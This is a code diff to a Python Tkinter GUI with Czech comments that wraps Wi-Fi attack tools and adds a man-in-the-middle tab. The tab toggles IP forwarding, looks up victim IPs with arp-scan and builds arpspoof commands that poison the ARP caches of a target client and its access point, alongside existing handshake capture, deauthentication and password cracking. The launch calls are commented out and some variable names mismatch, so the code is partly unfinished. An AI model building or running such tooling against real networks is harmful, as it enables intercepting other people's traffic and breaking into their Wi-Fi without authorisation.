@@ -29,6 +29,9 @@ airodump_process = None
 airodump_client_process = None
 deauth_process = None
 aircrack_process = None
+arpspoof_cl_process = None
+arpspoof_ap_process = None
+
 # Globální flag pro ukončení threadu se čtením ze souboru TODO jakého souboru? přejmenovat!
 stop_reading_file = False
 
@@ -661,7 +664,7 @@ def grep_aircrack_process():
     crack_pw_progress.grid_forget()
 # ========================================================================================================================
 def crack_pw():
-    crack_pw_progress.grid(row=3,column=0,columnspan=3, sticky=EW)
+    crack_pw_progress.grid(row=3,column=0,columnspan=4, sticky=EW)
     status.config(text="Lámání hesla")
 
     #capfile = "wpa-good.cap"        # TODO změnit na fungující hovno !!!!!!!!!!!!!!!!
@@ -675,7 +678,6 @@ def crack_pw():
     # TODO check jestli se tohle nezobrazí dřív, než doběhne lámání helsa
     status.config(text="Heslo bylo úspěšně prolomeno!")
 
-# ========================================================================================================================
 # ========================================================================================================================
 def connect_to_wifi():
     try:
@@ -698,11 +700,125 @@ def connect_to_wifi():
         subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
 
         status.config(text=f"Úspěšně připojeno k cílové Wi-fi síti!")
-        connect_button.configure(state=DISABLED) ########################################################################
+        connect_button.configure(state=DISABLED) 
 
     except subprocess.CalledProcessError as e:
-        status.config(text=f"Chyba při npřipojování k síti: {e}")
+        status.config(text=f"Chyba při připojování k síti: {e}")
         print(f"Chyba při připojování k síti: {e}")
+# ========================================================================================================================
+# ========================================================================================================================
+def start_forwarding():
+    try:
+        # Zapne přeposílání paketů
+        command = "echo 1 > /proc/sys/net/ipv4/ip_forward"
+        #command = "sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'"
+        print("COMMAND: " + command)
+        subprocess.run(command, check=True)
+        #subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)        
+        print(f"Přeposílání paketů bylo úspěšně zapnuto.")
+        status.config(text="Přeposílání paketů zapnuto")
+        forwarding_on_button.configure(state=DISABLED) 
+        forwarding_off_button.configure(state=NORMAL)
+    except subprocess.CalledProcessError as e:
+        status.config(text=f"Chyba při zapínání přeposílání paketů: {e}")
+        print(f"Chyba při zapínání přeposílání paketů: {e}")
+# ========================================================================================================================
+def stop_forwarding():
+    try:
+        # Zapne přeposílání paketů
+        command = "echo 0 > /proc/sys/net/ipv4/ip_forward"
+        print("COMMAND: " + command)
+        subprocess.run(command, check=True)
+        #subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)        
+        print(f"Přeposílání paketů bylo úspěšně vypnuto.")
+        status.config(text="Přeposílání paketů vypnuto")
+        forwarding_off_button.configure(state=DISABLED) 
+        forwarding_on_button.configure(state=NORMAL)
+    except subprocess.CalledProcessError as e:
+        status.config(text=f"Chyba při vypínání přeposílání paketů: {e}")
+        print(f"Chyba při vypínání přeposílání paketů: {e}")
+# ========================================================================================================================
+def find_ip_by_mac(mac_address, interface):
+    """
+    Find the IP address corresponding to a given MAC address using arp-scan.
+    
+    :param mac_address: The MAC address to search for.
+    :param interface: The network interface to use for scanning.
+    :return: The corresponding IP address if found, else None.
+    """
+    try:
+        # Run arp-scan on the specified interface
+        result = subprocess.check_output(['sudo', 'arp-scan', '--interface', interface, '--localnet'], text=True)
+        
+        # Iterate through each line of the output
+        for line in result.splitlines():
+            # Check if the current line contains the MAC address
+            if mac_address.lower() in line.lower():
+                # Extract and return the IP address
+                ip_address = line.split()[0]
+                return ip_address
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        return None
+
+# ========================================================================================================================
+def start_arp_spoofing():
+    try:
+        # Zapínám pohyb progress baru
+        arp_spoofing_progress.grid(row=1,column=0,columnspan=3)
+        arp_spoofing_progress.start(10)
+        global interface
+        global ap
+        global cl
+
+        client_ip = find_ip_by_mac(cl, interface)
+        if not client_ip:
+            print("ERROR při překladu client MAC na IP")
+
+        ap_ip = find_ip_by_mac(ap, interface)
+        if not ap_ip:
+            print("ERROR při překladu AP MAC na IP")
+
+        command = f"sudo arpspoof -i {interface} -t {client_ip} {ap_ip}"
+        print("COMMAND: " + command)
+        global arp_cl_process 
+        #arp_cl_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+
+        command = f"sudo arpspoof -i {interface} -t {ap_ip} {client_ip}"
+        print("COMMAND: " + command)
+        global arp_ap_process 
+        #arp_ap_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+
+        # Nastavuji správně tlačítka
+        arp_spoofing_on_button.configure(state=DISABLED) 
+        arp_spoofing_off_button.configure(state=NORMAL) 
+
+        print(f"ARP spoofing byl úspěšně spuštěn.")
+    except subprocess.CalledProcessError as e:
+        status.config(text=f"Chyba při zapínání ARP spoofingu: {e}")
+        print(f"Chyba při zapínání ARP spoofingu: {e}")
+# ========================================================================================================================
+def stop_arp_spoofing():
+    global arpspoof_cl_process 
+    global arpspoof_ap_process
+
+    if arpspoof_cl_process:
+        os.killpg(os.getpgid(arpspoof_cl_process.pid), signal.SIGTERM)
+        print("  -- Process arpspoofing pro klienta byl zastaven.")
+
+    if arpspoof_ap_process:
+        os.killpg(os.getpgid(arpspoof_ap_process.pid), signal.SIGTERM)
+        print("  -- Process arpspoofing pro access point byl zastaven.")
+
+    # Zastavuji progress bar pro zachytavani handshaku
+    arp_spoofing_progress.stop()
+    arp_spoofing_progress.grid_forget()
+
+    arp_spoofing_on_button.configure(state=NORMAL) 
+    arp_spoofing_off_button.configure(state=DISABLED) 
+    
+    print(f"ARP spoofing byl úspěšně zastaven.")
+    status.config(text=f"ARP spoofing byl úspěšně zastaven.")
 
 # ========================================================================================================================
 # ========================================================================================================================
@@ -723,6 +839,7 @@ def update_button_state():
 # ========================================================================================================================
 # Funkce pro ukončení aplikace při stisku CTRL+C
 def destroyer(event):
+    # TODO kill všechny procesy - asi zbytečně, protože to jsou všechny deamoni a skončí sami, ale je slušnost po sobě uklidit
     root.destroy()
     print('Končím po stiskuní CTRL + C')
 # ========================================================================================================================================
@@ -978,7 +1095,7 @@ crack_pw_current_line_label.grid(row=2, column=0, columnspan=2)
 
 deauth_frame.grid_columnconfigure(2, weight=1)
 
-# Network Connection Frame ========================================================================================================================
+# Network Connection Frame ===============================================================================================================
 connect_frame = LabelFrame(frame_t3, text="Připojit se k cílové Wi-Fi síti", highlightthickness=4, borderwidth=4)
 connect_frame.pack(padx=10,pady=5, fill='x')
 
@@ -990,13 +1107,38 @@ password_label.grid(row=0, column=1, padx=5, pady=5)
 connect_button = Button(connect_frame, text="Připojit se k síti", width= 20, command=connect_to_wifi)
 connect_button.grid(row=1, column=0, columnspan=2, padx=5, pady=5)
 
-
+# ========================================================================================================================================
 # Tab "Man-in-the-middle" ================================================================================================================
+forwarding_frame = LabelFrame(frame_t4, text="Přeposílání paketů", highlightthickness=4, borderwidth=4)
+forwarding_frame.pack(padx=10,pady=5, fill='x')
 
+forwarding_on_button = Button(forwarding_frame, text="Zapnout", width= 20, command=start_forwarding)
+forwarding_on_button.grid(row=0, column=0, padx=5, pady=5)
 
+forwarding_off_button = Button(forwarding_frame, text="Vypnout", width= 20, command=stop_forwarding)
+forwarding_off_button.grid(row=0, column=1, padx=5, pady=5)
+
+# ARP Spoof Frame ===============================================================================================================
+arp_spoofing_frame = LabelFrame(frame_t4, text="ARP Spoofing", highlightthickness=4, borderwidth=4)
+arp_spoofing_frame.pack(padx=10,pady=5, fill='x')
+
+arp_spoofing_on_button = Button(arp_spoofing_frame, text="Zapnout", width= 20, command=start_arp_spoofing)
+arp_spoofing_on_button.grid(row=0, column=0, padx=5, pady=5)
+
+arp_spoofing_off_button = Button(arp_spoofing_frame, text="Vypnout", width= 20, command=stop_arp_spoofing)
+arp_spoofing_off_button.grid(row=0, column=1, padx=5, pady=5)
+
+arp_spoofing_progress = ttk.Progressbar(arp_spoofing_frame, orient=HORIZONTAL, length=800, mode='indeterminate')
+arp_spoofing_progress.step(0)
+
+# ========================================================================================================================================
 # Tab "Odposlech DNS dotazů" =============================================================================================================
 
 
+
+
+
+# ========================================================================================================================================
 # Status bar =============================================================================================================================
 status = Label(root, text="OK", bd=2, relief=SUNKEN, anchor=SW)
 status.pack(fill='x', side=BOTTOM)
